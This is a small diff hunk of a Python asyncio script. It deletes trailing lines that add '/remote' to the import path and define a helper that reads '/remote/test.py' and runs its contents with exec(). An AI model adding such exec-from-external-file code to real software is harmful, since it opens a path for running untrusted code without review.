@@ -39,10 +39,3 @@ async def main():
 # Запуск программы
 try: asyncio.run(main())
 except KeyboardInterrupt: print('Program interrupted')
-
-
-
-import sys; sys.path.append('/remote')
-
-def _import(name='/remote/test.py'): 
-    with open(name) as f: exec(f.read())
